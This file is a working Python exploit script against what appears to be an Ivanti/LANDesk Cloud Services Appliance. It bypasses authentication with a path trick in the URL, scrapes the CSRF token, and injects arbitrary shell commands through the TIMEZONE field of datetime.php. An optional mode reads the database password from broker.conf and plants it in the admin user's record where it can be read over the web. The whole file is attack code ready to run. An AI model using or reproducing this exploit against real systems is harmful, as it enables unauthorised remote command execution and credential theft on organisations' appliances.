#!/usr/bin/python3
import argparse
import re
import requests
import sys
import random
import urllib3
from requests.auth import HTTPBasicAuth

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit(url, command, exfiltrate):
    # For basic auth. Not validated by server using path traversal, but the header is required.  
    username = "notadmin"
    password = "thisdoesntmatter"

    session = requests.Session()

    # Systematic issue. Any file will work.
    file_choices = ["index.php", "about.php", "test.php"]
    chosen_file = random.choice(file_choices)
    print(f"[+] Choosing random entry point: {chosen_file}")
    print("[*] Fetching LDCSA_CSRF token...")
    response = session.get(
        f"{url}/client/{chosen_file}%3F.php/gsb/datetime.php",
        auth=HTTPBasicAuth(username, password),
        verify=False
    )
    match = re.search(r"name=['\"]LDCSA_CSRF['\"]\s+value=['\"]([^'\"]+)['\"]", response.text)
    if not match:
        print("[-] Failed getting LDCSA_CSRF token")
        sys.exit(0)

    ldcsa = match.group(1)
    print(f"[+] Got LDCSA_CSRF value: {ldcsa}")

    # Data exfiltration of db password
    if exfiltrate:
        command = "export PGPASSWORD=$(cat /opt/landesk/broker/broker.conf | grep PGSQL_PW | cut -d '=' -f2-); echo \"update user_info set organization='$PGPASSWORD' where username='admin'\" | psql -d brokerdb -U gsbadmin"
        print("[*] Exfiltration mode activated. Using predefined SQL injection command.")
        print(f"[+] Go to ({url}/client/{chosen_file}%3F.php/gsb/users.php) to see the database password in the organization field.")

    payload = {
        "dateTimeFormSubmitted": "1",
        "TIMEZONE": f"; `{command}` ;",
        "CYEAR": "2024",
        "CMONTH": "11",
        "CDAY": "27",
        "CHOUR": "12",
        "CMIN": "47",
        "LDCSA_CSRF": ldcsa,
        "SUBMIT_TIME": "Save"
    }
    print("[*] Sending payload...")
    session.post(
        f"{url}/client/{chosen_file}%3F.php/gsb/datetime.php",
        auth=HTTPBasicAuth(username, password),
        verify=False,
        data=payload
    )
    print("[+] Payload sent successfully.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='The base URL of the target', required=True)
    group = parser.add_mutually_exclusive_group(required=False)
    group.add_argument('-c', '--command', help='The command to execute blind', type=str)
    group.add_argument('-e', '--exfiltrate', action='store_true', help='Exfiltrate DB password via SQL injection')
    args = parser.parse_args()

    if args.command:
        exploit(args.url, args.command, False)
    elif args.exfiltrate:
        exploit(args.url, None, True)
